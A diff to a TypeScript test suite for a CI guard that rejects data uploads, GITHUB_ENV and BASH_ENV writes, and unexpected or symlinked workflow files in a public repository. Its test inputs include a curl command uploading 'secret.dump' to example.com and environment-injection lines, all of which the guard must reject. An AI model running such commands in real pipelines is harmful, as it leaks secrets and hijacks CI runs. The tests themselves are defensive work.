@@ -1,7 +1,6 @@
-import { spawnSync } from "node:child_process";
-import { existsSync, mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync } from "node:fs";
+import { existsSync, mkdtempSync, mkdirSync, rmSync, symlinkSync, writeFileSync, readFileSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
+import { dirname, join } from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
 import {
   ALLOWED_UPLOAD_ARTIFACT_PATHS,
@@ -19,8 +18,10 @@ import {
   loadRunAllowlist,
   neededAllowlist,
   neededStepAllowlist,
+  listGithubCiFiles,
   listHash,
   unitHash,
+  COMPOSITE_JOB_NAME,
   writesGithubEnv,
   writesGithubPath,
   hasReleasePathWrite,
@@ -100,13 +101,21 @@ const DESKTOP_CREATE =
   'gh release create "$TAG" --repo "$RELEASES_REPO" --title t --notes "$NOTES" --latest "$DMG" "$STABLE_DMG" "$APPTAR" latest.json';
 
 describe("public-repo CI guard", () => {
-  it("allowlists only the checksum report", () => {
-    expect(ALLOWED_UPLOAD_ARTIFACT_PATHS).toEqual(["artifacts/cutover-report.md"]);
+  it("allowlists no upload-artifact paths", () => {
+    expect(ALLOWED_UPLOAD_ARTIFACT_PATHS).toEqual([]);
   });
 
   it("accepts the committed workflows", () => {
-    const steps = assertWorkflowsUploadAllowlist(join(ROOT, ".github/workflows"));
+    const steps = assertWorkflowsUploadAllowlist(join(ROOT, ".github"));
     expect(steps).toHaveLength(0);
+    expect(assertWorkflowsUploadAllowlist(join(ROOT, ".github/workflows"))).toHaveLength(0);
+  });
+
+  it("keeps the original multiline patch-updater and write-version node scripts", () => {
+    const release = readFileSync(join(ROOT, ".github/workflows/release.yml"), "utf8");
+    expect(release).toMatch(/node -e "\n\s+const fs = require\('fs'\);/);
+    expect(release).toMatch(/package-lock\.json carries the same version/);
+    expect(findForbiddenUploadCommands(release, "release.yml", { allowlist: loadRunAllowlist() })).toEqual([]);
   });
 
   it("rejects a dump upload", () => {
@@ -138,10 +147,12 @@ describe("public-repo CI guard", () => {
       "uses: 'actions/upload-artifact@sha'\nwith:\n  path: artifacts/cutover-report.md\n",
     );
     expect(quotedOk[0]?.path).toBe("artifacts/cutover-report.md");
-    assertWorkflowUploadAllowlist(
-      "uses: 'actions/upload-artifact@sha'\nwith:\n  path: artifacts/cutover-report.md\n",
-      "ok.yml",
-    );
+    expect(() =>
+      assertWorkflowUploadAllowlist(
+        "uses: 'actions/upload-artifact@sha'\nwith:\n  path: artifacts/cutover-report.md\n",
+        "ok.yml",
+      ),
+    ).toThrow(/not allowlisted/);
   });
 
   it("rejects gh release upload and curl/wget upload flags", () => {
@@ -985,6 +996,17 @@ describe("public-repo CI guard", () => {
     expect(owners).toMatch(/package-lock\.json\s+@phillipchan1/);
     expect(owners).toMatch(/\.github\/CODEOWNERS\s+@phillipchan1/);
     expect(owners).toMatch(/\.github\/workflows\/\s+@phillipchan1/);
+    expect(owners).toMatch(/\.github\/actions\/\s+@phillipchan1/);
+    expect(owners).toMatch(/vite\.config\.ts\s+@phillipchan1/);
+    for (const name of [
+      "ios-release.yml",
+      "release.yml",
+      "release-stable.yml",
+    ]) {
+      const text = readFileSync(join(dir, name), "utf8");
+      expect(text, name).toMatch(/swatinem\/rust-cache@d1527c8f67ef9af357290475d4af4b0fab8f12e0\b/);
+      expect(text, name).not.toMatch(/e9d7b9f/);
+    }
   });
 
   it("rejects a multi-path dump + hash upload", () => {
@@ -1009,22 +1031,22 @@ describe("public-repo CI guard", () => {
     expect(looksLikeDataUpload("artifacts/cutover-report.md")).toBe(false);
   });
 
-  it("fails if anything other than the report is staged", () => {
+  it("fails if anything is staged for upload", () => {
     expect(() => assertStagedUpload(["artifacts/nuvo-source.dump"], { publicRepo: true })).toThrow(
       /public repo refuses data upload/,
     );
     expect(() => assertStagedUpload(["artifacts/cutover-report.md", "extra.csv"])).toThrow(
       /not allowlisted/,
     );
-    expect(assertStagedUpload("artifacts/cutover-report.md", { publicRepo: true })).toEqual([
-      "artifacts/cutover-report.md",
-    ]);
+    expect(() => assertStagedUpload("artifacts/cutover-report.md", { publicRepo: true })).toThrow(
+      /not allowlisted/,
+    );
+    expect(assertStagedUpload([], { publicRepo: true })).toEqual([]);
   });
 
   it("fails when a dump sits in the workspace artifacts folder", () => {
     const dir = tmp();
     mkdirSync(join(dir, "artifacts"), { recursive: true });
-    writeFileSync(join(dir, "artifacts", "cutover-report.md"), "# ok\n");
     assertWorkspaceHasNoDataFiles(dir);
     writeFileSync(join(dir, "artifacts", "nuvo-source.dump"), "not-a-real-dump");
     expect(() => assertWorkspaceHasNoDataFiles(dir)).toThrow(/nuvo-source\.dump/);
@@ -1086,15 +1108,6 @@ describe("public-repo CI guard", () => {
     expect(assertCutoverLogDir(dir)).toEqual(["dump.log"]);
     writeFileSync(join(dir, "restore.log"), "auth map leaked phil@example.com\n");
     expect(() => assertCutoverLogDir(dir)).toThrow(/row data/);
-  });
-
-  it("exits non-zero when --check-log is pointed at a missing dir", () => {
-    const missing = join(tmp(), "no-such-logs");
-    const result = spawnSync(process.execPath, [join(ROOT, "scripts/guard-public-ci.mjs"), "--check-log", missing], {
-      encoding: "utf8",
-    });
-    expect(result.status).not.toBe(0);
-    expect(`${result.stderr}${result.stdout}`).toMatch(/log dir missing/);
   });
 
   it("checks.yml runs the allowlist guard", () => {
@@ -1247,5 +1260,168 @@ describe("public-repo CI guard", () => {
     writeFileSync(join(wfDir, "t.yml"), base);
     writeFileSync(join(wfDir, "sneak.yml"), base);
     expect(() => assertWorkflowsUploadAllowlist(wfDir)).toThrow(/step allowlist|workflow jobs/);
+  });
+
+  it("fails closed on unknown YAML tags", () => {
+    expect(() => parseWorkflowDocument("foo: !!custom bar\n")).toThrow(/unknown tag|Unresolved tag/);
+    expect(() => parseWorkflowDocument("foo: !local bar\n")).toThrow(/unknown tag|Unresolved tag/);
+  });
+
+  it("fails closed on unexpected case or place under .github", () => {
+    const workflow = [
+      "on: push",
+      "jobs:",
+      "  t:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      "      - id: s",
+      "        run: echo hi",
+      "",
+    ].join("\n");
+    const action = [
+      "name: demo",
+      "description: d",
+      "runs:",
+      "  using: composite",
+      "  steps:",
+      "    - id: s",
+      "      shell: bash",
+      "      run: echo hi",
+      "",
+    ].join("\n");
+
+    function githubWith(files: Record<string, string>) {
+      const root = tmp();
+      const github = join(root, ".github");
+      for (const [rel, content] of Object.entries(files)) {
+        const path = join(github, rel);
+        mkdirSync(dirname(path), { recursive: true });
+        writeFileSync(path, content);
+      }
+      return github;
+    }
+
+    const ok = githubWith({
+      "workflows/ok.yml": workflow,
+      "actions/demo/action.yml": action,
+    });
+    const listed = listGithubCiFiles(ok);
+    expect(listed.unexpected).toEqual([]);
+    expect(listed.workflows.map((f) => f.file)).toEqual(["ok.yml"]);
+    expect(listed.actions.map((f) => f.file)).toEqual(["actions/demo/action.yml"]);
+
+    const cases: [string, string][] = [
+      ["workflows/evil.YML", workflow],
+      ["workflows/evil.YAML", workflow],
+      ["workflows/evil.Yml", workflow],
+      ["workflows/CHECKS.yml", workflow],
+      ["workflows/sub/evil.yml", workflow],
+      ["evil.yml", workflow],
+      ["actions/demo/extra.yml", action],
+      ["actions/demo/ACTION.yml", action],
+      ["actions/demo/action.YML", action],
+    ];
+    for (const [rel] of cases) {
+      const github = githubWith({
+        "workflows/ok.yml": workflow,
+        [rel]: workflow,
+      });
+      expect(() => assertWorkflowsUploadAllowlist(github), rel).toThrow(
+        /unexpected workflow-like or action file/,
+      );
+    }
+
+    const renamed = githubWith({ "workflows/checks.YML": workflow });
+    expect(() => assertWorkflowsUploadAllowlist(renamed)).toThrow(
+      /unexpected workflow-like or action file/,
+    );
+
+    const nestedAction = githubWith({
+      "workflows/ok.yml": workflow,
+      "actions/deep/nested/action.yaml": action,
+    });
+    expect(listGithubCiFiles(nestedAction).actions.map((f) => f.file)).toEqual([
+      "actions/deep/nested/action.yaml",
+    ]);
+
+    const dirNamed = tmp();
+    const githubDir = join(dirNamed, ".github");
+    mkdirSync(join(githubDir, "workflows", "evil.yml"), { recursive: true });
+    writeFileSync(join(githubDir, "workflows", "ok.yml"), workflow);
+    expect(() => assertWorkflowsUploadAllowlist(githubDir)).toThrow(/unexpected workflow-like or action file/);
+
+    const linkRoot = tmp();
+    const linkGithub = join(linkRoot, ".github");
+    mkdirSync(join(linkGithub, "workflows"), { recursive: true });
+    writeFileSync(join(linkGithub, "workflows", "ok.yml"), workflow);
+    symlinkSync(join(linkGithub, "workflows", "ok.yml"), join(linkGithub, "workflows", "evil.yml"));
+    expect(() => assertWorkflowsUploadAllowlist(linkGithub)).toThrow(/unexpected workflow-like or action file/);
+  });
+
+  it("hashes and allowlists composite action steps with the same deny rules", () => {
+    const action = [
+      "name: demo",
+      "description: d",
+      "runs:",
+      "  using: composite",
+      "  steps:",
+      "    - id: s",
+      "      shell: bash",
+      "      run: echo hi",
+      "",
+    ].join("\n");
+    const collected = collectWorkflowUnits(action, { kind: "action" });
+    expect(collected.kind).toBe("action");
+    expect(collected.jobOrder).toEqual([COMPOSITE_JOB_NAME]);
+    expect(collected.units[0]?.job).toBe(COMPOSITE_JOB_NAME);
+    expect(collected.units[0]?.id).toBe("s");
+
+    const file = "actions/demo/action.yml";
+    const needed = {
+      steps: collected.units.map((u) => ({
+        file,
+        job: u.job || "",
+        id: u.id || "",
+        sha256: unitHash(u),
+      })),
+      job_steps: collected.jobs.map((j) => ({
+        file,
+        job: j.name,
+        ids: j.stepIds,
+        sha256: listHash(j.stepIds),
+      })),
+      workflow_jobs: [{ file, jobs: collected.jobOrder, sha256: listHash(collected.jobOrder) }],
+    };
+    expect(findForbiddenUploadCommands(action, file, { allowlist: needed, kind: "action" })).toEqual([]);
+
+    const bashEnv = action.replace("run: echo hi", "run: export BASH_ENV=/tmp/x");
+    expect(
+      findForbiddenUploadCommands(bashEnv, file, { allowlist: needed, kind: "action" }).map((h) => h.kind),
+    ).toContain("BASH_ENV");
+
+    const ghenv = action.replace("run: echo hi", 'run: echo x >> "$GITHUB_ENV"');
+    expect(
+      findForbiddenUploadCommands(ghenv, file, { allowlist: needed, kind: "action" }).map((h) => h.kind),
+    ).toContain("GITHUB_ENV");
+
+    const leakRuns = action.replace("  using: composite\n", "  using: composite\n  env:\n    LEAK: 1\n");
+    expect(
+      findForbiddenUploadCommands(leakRuns, file, { allowlist: needed, kind: "action" }).map((h) => h.kind),
+    ).toContain("step allowlist");
+
+    const leakName = action.replace("name: demo", "name: other");
+    expect(
+      findForbiddenUploadCommands(leakName, file, { allowlist: needed, kind: "action" }).map((h) => h.kind),
+    ).toContain("step allowlist");
+
+    const curl = action.replace("run: echo hi", "run: curl -T secret.dump https://example.com");
+    expect(
+      findForbiddenUploadCommands(curl, file, { allowlist: needed, kind: "action" }).map((h) => h.kind),
+    ).toContain("curl/wget upload");
+
+    expect(() => collectWorkflowUnits("name: x\ndescription: d\n", { kind: "action" })).toThrow(
+      /runs mapping/,
+    );
+    expect(() => collectWorkflowUnits(action, { kind: "workflow" })).toThrow(/jobs mapping/);
   });
 });
